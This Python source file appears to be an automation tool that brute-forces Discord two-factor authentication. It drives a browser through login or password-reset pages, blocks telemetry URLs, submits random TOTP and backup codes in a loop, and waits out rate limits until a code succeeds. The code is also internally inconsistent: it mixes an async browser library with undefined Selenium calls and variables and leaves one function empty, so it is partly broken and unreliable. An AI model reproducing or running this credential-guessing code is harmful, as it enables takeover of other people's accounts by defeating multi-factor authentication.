# Import dependencies and libraries
import os
import secrets
import time
from pprint import pformat
from typing import Tuple

from loguru import Level, logger

from src.lib.types import CodePage, SessionStats

sensitive: Level = logger.level(name="SENSITIVE", no=15, color="<m><b>")

from src.lib.codegen import generate_random_code
from src.lib.exceptions import UserCausedHalt, unwrap
from src.lib.textcolor import color
from src.lib.types import (
    CodeMode_Backup,
    CodeMode_Normal,
    Config,
    LoginFields,
    ProgramMode,
)

ReturnKeyUnicode: str = "\ue006"

import zd
from zd.core.browser import Browser
from zd.core.element import Element
from zd.core.tab import Tab


async def bootstrap_browser(config: Config) -> Browser:
    """
    bootstrap_browser is a function that prepares a puppetable browser.
    """

    # TODO: implement browser choice between chrome or chromium
    # TODO: add detach mode, so the browser doesn't die when you kill the program
    browser: Browser = unwrap(
        await zd.start(
            headless=config.program.headless,
            lang="en-US",  # Force the browser window into English-US language so we can find the code XPATH by string matching,
        )
    )
    logger.debug(f"Started browser")

    default_tab: Tab = unwrap(browser.main_tab)
    await default_tab.send(
        cdp_obj=zd.cdp.network.set_blocked_ur_ls(
            urls=[
                "a.nel.cloudflare.com/report",
                "https://discord.com/api/*/science",
                "sentry.io",
            ]
        )
    )
    logger.debug("Blocked telemetry URLs")

    await default_tab.send(cdp_obj=zd.cdp.network.enable())
    logger.debug("Enabled network connectivity")

    return browser


async def bootstrap_code_page(
    browser: Browser,
    config: Config,
) -> Tuple[Config, Tab, LoginFields]:
    """
    This sets up the code entry page, and gives us the correct login fields per mode.
    """

    # Go to the appropriate starting page for the mode
    landing_url: str | None = None
    match config.program.programMode:
        case ProgramMode.Login:
            landing_url = "https://discord.com/login"
        case ProgramMode.Reset:
            landing_url = f"https://discord.com/reset#token={config.account.resetToken}"
    tab: Tab = unwrap(await browser.get(unwrap(landing_url)))
    logger.debug(f"Gone to {config.program.programMode.name} page")

    # Find input fields.
    loginFields: LoginFields = LoginFields()
    match config.program.programMode:
        case ProgramMode.Login:
            loginFields.email = unwrap(await tab.find_element_by_text("email"))
    loginFields.password = unwrap(await tab.find_element_by_text("password"))

    # input found fields.
    match config.program.programMode:
        case ProgramMode.Login:
            await loginFields.email.send_keys(config.account.email)
            await loginFields.password.send_keys(config.account.password)
        case ProgramMode.Reset:
            await loginFields.password.send_keys(config.account.newPassword)
    await loginFields.password.send_keys(ReturnKeyUnicode)
    logger.debug("Found and inputted basic login fields")

    # TODO: when password reset token expires, it doesn't progress past this stage. handle this case
    # TODO: we prolly wanna solve the captcha here.

    # fmt: off
    match config.program.codeMode:
        case CodeMode_Normal():
            loginFields.code = (await tab.xpath("//input[@placeholder='6-digit authentication code']"))[0]
        case CodeMode_Backup():
            await (await tab.xpath("//*[contains(text(), 'Verify with something else')]"))[0].click()
            await (await tab.xpath("//*[contains(text(), 'Use a backup code')]"))[0].click()
            loginFields.code = (await tab.xpath("//input[@placeholder='8-digit backup code']"))[0]
    # fmt: on

    return config, tab, loginFields


async def didWeSubmitSuccesfully(submitButton: Element) -> bool:
    """
    Rising-Falling edge detector
    LOW: aria-busy=false
    HIGH: aria-busy=true

    The pattern to detect:
               ____..._____
    ..._______|            |__________...

    BREAK INFINITE DETECT LOOP: Give False after 5 sec elapse, if we haven't returned before then
    """


async def code_entry(config: Config, tab: Tab, loginFields: LoginFields) -> None:
    try:
        """Logic to continously enter TOTP/Backup codes"""

        # Set up statistics counters
        sessionStats: SessionStats = SessionStats(0, 0, 0, 0.0)
        start_time: float = time.time()
        sleep_duration_seconds: float = 0

        logger.info("Starting a Forcer session")
        logger.debug(pformat(config.program))
        logger.log("SENSITIVE", pformat(config.account))

        submitButton: Element = (
            await tab.xpath(xpath="//*[contains(text(), 'Confirm')]")
        )[0]

        # Generate a new code. if CodeMode is CodeMode.Backup check it against the used codes list
        while True:
            random_code: str = generate_random_code(config.program.codeMode)

            # Use the 8-digit code only if it's not in the used_backup_codes.txt list. Add the code to the list if we use it.
            # TODO: the thing that really sucks here is even if a backup code is valid, by trying it here and logging in, we invalidate it. (backup codes expire on use)
            if config.program.codeMode is CodeMode_Backup:
                with open("user/used_backup_codes.txt", "a+") as f:
                    f.seek(0)
                    used_backup_codes: list[str] = f.readlines()
                    if random_code in used_backup_codes:
                        logger.warning(
                            f"Backup code {random_code} is invalid. Possibly we previously used it, but now it's expired anyway."
                        )
                        continue
                    #   ^^------------------
                    else:
                        f.write(f"{random_code}\n")

            # I want to break out if code is success, and retry if we get actively ratelimited?
            await loginFields.code.send_keys(random_code)
            await submitButton.click()
            
            sessionStats.attemptedCodeCount += 1
            # TODO: handle the case where a click fails, e.g network request didn't get sent
            # TODO: dynamic sleep delay interval changing based on changing condition?

            WebDriverWait(browser, 10, 0.01).until(
                EC.element_to_be_clickable(
                    (By.XPATH, "//*[contains(text(), 'Confirm')]")
                )
            )  # Wait for page to update so we can detect changes such as rate limited.

            while (
                "The resource is being rate limited." in browser.page_source
                or "Service resource is being rate limited" in browser.page_source
            ):
                sleep_duration_seconds = secrets.choice(range(5, 7))
                session_statistics["ratelimitCount"] += 1
                logger.warning(
                    f"Code {random_code} was ratelimited. Retrying in {sleep_duration_seconds} seconds"
                )
                time.sleep(sleep_duration_seconds)
                loginFields["TOTP"].send_keys(Keys.RETURN)
                browser.implicitly_wait(0.3)

            if "Token has expired" in browser.page_source:
                # Print this out as well as some statistics, and prompt the user to retry.
                session_statistics["elapsedTime"] = time.time() - start_time
                print_session_statistics(
                    "invalid_password_reset_token", session_statistics
                )
                # Close the browser and stop the script.
                browser.close()
                break

            # This means that Discord has expired this login session, we must restart the process.
            elif "Invalid token" in browser.page_source:
                #  Testing for a new localised message.
                #  Print this out as well as some statistics, and prompt the user to retry.
                session_statistics["elapsedTime"] = time.time() - start_time
                print_session_statistics(
                    "invalid_password_reset_token", session_statistics
                )
                # Close the browser and stop the script.
                browser.close()
                break

            # The entered TOTP code is invalid. Wait a few seconds, then try again.
            else:
                sleep_duration_seconds = secrets.choice(range(2, 6))
            # Testing if the main app UI renders.
            try:
                # Wait 1 second, then check if the Discord App's HTML loaded by it's CSS class name. If loaded, then output it to the user.
                loginTest = browser.find_element(
                    by=By.CLASS_NAME, value="app_de4237"
                )  # Will need a better way to detect the presence of a class.
                browser.implicitly_wait(1)
                logger.success(f"Code {random_code} worked!")
            except NoSuchElementException:
                # This means that the login was unsuccessful so let's inform the user and wait.
                logger.warning(
                    f"Code: {random_code} did not work. Retrying in {sleep_duration_seconds} seconds"
                )
                time.sleep(sleep_duration_seconds)
                while True:
                    try:
                        WebDriverWait(browser, 5).until(
                            EC.element_to_be_clickable((loginFields["TOTP"]))
                        )  # Waits until element is clickable
                        break
                    except TimeoutException:
                        logger.warning(
                            "The page is taking too long ( > 5 seconds) to load the code entry field"
                        )
                        session_statistics["slowDownCount"] += 1
                # Backspace the previously entered TOTP code.
                for i in range(len(random_code)):
                    loginFields["TOTP"].send_keys(Keys.BACKSPACE)
    except NoSuchWindowException:
        session_statistics["elapsedTime"] = time.time() - start_time
        print_session_statistics("invalid_session_ticket", session_statistics)
    except KeyboardInterrupt:
        session_statistics["elapsedTime"] = time.time() - start_time
        print_session_statistics("closed_by_user", session_statistics)
        raise UserCausedHalt


def print_session_statistics(halt_reason: str, session_statistics: dict):
    """
    Displays statistics and the reason for program halt.

    :param halt_reason: A string representing the reason why the program halted.
    :type halt_reason: str
    :param session_statistics: A dictionary containing statistical data.
    :type session_statistics: dict
    :return: This function does not return anything.
    """
    halt_reasons = {
        "invalid_session_ticket": "Invalid session ticket",
        "invalid_password_reset_token": "Invalid password reset token. Generate a new one by following the same instructions as before.",
        "closed_by_user": "Halted by user",
        "password_reset_required": f"We need to reset the password!\n"
        f"Running 'reset program mode'!\n"
        f"This feature will only work if the resetToken is filled in the .env file.",
    }
    logger.error(
        f"Halt reason:                                                     {               halt_reasons[halt_reason]}"
    )
    logger.info(
        f'Program mode:                                                    {       session_statistics["programMode"]}'
    )
    logger.info(
        f'Code mode:                                                       {          session_statistics["codeMode"]}'
    )
    logger.info(
        f'Number of tried codes:                                           {session_statistics["attemptedCodeCount"]}'
    )
    logger.info(
        f'Total time elapsed:                                              {       session_statistics["elapsedTime"]}'
    )
    logger.info(
        f'Number of ratelimits:                                            {    session_statistics["ratelimitCount"]}'
    )
    logger.info(
        f'Number of slow downs observed (loading button/code entry field): {     session_statistics["slowDownCount"]}'
    )
